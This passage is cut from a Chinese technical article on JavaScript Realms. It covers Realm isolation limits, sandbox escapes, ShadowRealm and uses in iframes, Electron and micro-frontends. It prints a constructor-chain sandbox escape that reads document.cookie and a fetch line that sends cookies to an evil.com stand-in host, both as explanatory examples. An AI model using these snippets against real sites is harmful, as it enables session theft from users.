// 来自外层 Realm（iframe 创建时继承了外层的函数构造链）。

// 第四步：Function 可以执行任意字符串
{}.constructor.constructor('return document.cookie')();
// → 拿到了主页面的 cookie 💀
```

用大白话说就是：

> 你把沙箱的门锁了，但沙箱里的家具还记得老家的地址。
>
> 沿着 `constructor` 这条线索，沙箱里的代码能摸回外层的 `Function` 构造函数——然后就能执行任何代码。

Realm 重新铸造了一套 Intrinsics，但 JavaScript 的动态特性决定了：只要有构造函数的引用，就可能沿着 `constructor` 链往上爬。

类似的逃逸路径还有：

- **原型链污染**：沙箱里的代码拿到主页面的方法后，通过 `__proto__` 修改原型，可能影响主页面 Realm 的行为
- **Proxy 陷阱**：主页面传一个 Proxy 到 iframe，handler 在主页面的 Realm 里执行，沙箱可以通过它间接访问主页面的能力
- **getter/setter 副作用**：主页面定义的对象传到 iframe 后，读取属性会触发主页面的 getter，在主页面上下文执行

这也是为什么浏览器专家一直强调：

> iframe sandbox 不是安全边界，CSP 不是银弹，Realm 隔离不等于安全隔离。

### 局限三：没有 I/O 和能力隔离

Realm 隔离的是"对象体系"，不是"能力"。

```js
// 在沙箱 Realm 里
fetch('https://evil.com/steal?data=' + document.cookie);
```

如果你没显式删掉 `fetch`、`XMLHttpRequest`、`navigator` 这些全局变量，沙箱代码照样能发网络请求。

Realm 不会帮你做：文件系统访问控制、网络请求限制、DOM 操作权限管理、定时器限制。

Realm 只提供了"可以做隔离"的地基，具体怎么隔离要你自己搭。

### 局限四：性能开销不是零

每个 Realm 都要创建独立的 `globalThis`、独立的内建对象、独立的原型链关系、独立的全局词法作用域。

如果你创建了很多 Realm（比如微前端场景下每个子应用一个），这些开销会累积：

- **内存**：每套 Intrinsics 大约几百 KB 到几 MB
- **创建时间**：初始化一个 Realm 比创建一个普通对象慢得多
- **GC 压力**：更多的独立对象图意味着 GC 要扫描更多东西

所以"每个子应用一个 Realm"这个想法在理论上很美，实际落地时需要权衡。

### 局限五：调试和互操作的复杂度

跨 Realm 的代码调试起来特别痛苦：

```js
// 两个 Realm，两个 Array
realm1.Array === realm2.Array; // false
```

你在控制台看到一个数组，但它来自另一个 Realm——你没法用 instanceof 判断类型，没法直接用它的方法（方法绑定在另一个 Realm 的 prototype 上）。

此外：

- **错误对象**：跨 Realm 抛异常时，`err instanceof Error` 可能为 `false`，错误处理逻辑会翻车
- **DOM 节点**：跨 iframe 拿到的 DOM 节点，`instanceof HTMLElement` 可能为 `false`
- **Promise 链**：跨 Realm 的 `Promise.then` 回调在哪个 Realm 执行？答案是"看情况"，这增加了心智负担

### 局限六：规范推进缓慢，现实和理想有差距

ShadowRealm 提案（TC39 Stage 3）试图在 ECMAScript 层面提供一个"干净的"Realm API：

```js
const sr = new ShadowRealm();
const result = await sr.importValue('./module', 'exportName');
```

但推进过程一直有争议：和 Web 集成的边界不清楚（DOM API 能不能用？）、和 Web Worker 的定位重叠、安全模型到底要做到什么程度没有共识、各引擎实现进度不一致。

所以目前（2026 年），你在实际项目中能用的 Realm 隔离手段主要是：

- iframe（最成熟，但最笨重）
- Node.js `vm` 模块（官方明确说不安全）
- SES/Compartments（最严谨，但学习曲线陡峭）

---

## Realm 在开发场景中无处不在

Realm 并不只是 iframe 理论。很多你见过的问题，本质上都和 Realm 有关。

### iframe

最经典。`value instanceof HTMLElement` 跨 iframe 可能直接翻车，因为 `iframe.HTMLElement !== window.HTMLElement`。

### Electron

Electron 里的 preload、isolated world、BrowserWindow，本质上都涉及不同 Realm-like 环境。

### 浏览器插件

Chrome Extension 的 content script 和 page script，本质上也是同页面里的多个 JS 世界。

### 微前端

微前端框架一直在解决全局变量污染、prototype 污染、runtime 隔离，这些问题本质上都和 Realm 思想有关。

---

## 总结

很多人以为 Realm 就是“多个 global object”，这只是表象。Realm 更深刻的意义在于 **Capability Security**（能力安全）：把 JavaScript Runtime 的能力限制在一个受控的对象图内。

浏览器怕的从来不是 `var x = 1`，而是：
- `Object.prototype` 被篡改
- Promise 调度被劫持
- DOM API 被做手脚
- fetch 被拦截

Realm 解决的就是 **Runtime Capability Isolation**。这也是为什么 SES、Caja、ShadowRealm 这些安全模型都建立在 Realm 的思想之上。它不是在开新的 VM，而是在同一个 VM 里给你画了一道“能力边界”。

> 在不启动完整 VM 的情况下，隔离 JavaScript Runtime World。

于是隔离谱系变成了：

```
Process  → 隔离 OS Memory       (独栋别墅，最强也最贵)
Isolate  → 隔离 VM Runtime      (独立工作室，保护执行安全)
Realm    → 隔离 Runtime Object Graph (共享工作室，各拿各的规范手册)
Module   → 隔离 Lexical Scope   (自己的小抽屉，不管别人)
```

贯穿始终的是那句老理：**执行需要隔离，隔离反过来保障执行**。进程自己就是一个执行世界，所以隔离也最彻底；线程让执行并发起来，却也逼出了 Isolate 这层 VM 隔离；而在 Isolate 内部，Realm 又提供了一道更细粒度的对象能力边界。每一层都在为“安全高效地执行”服务，Realm 正是这条链上成本最低、粒度最巧的那一环。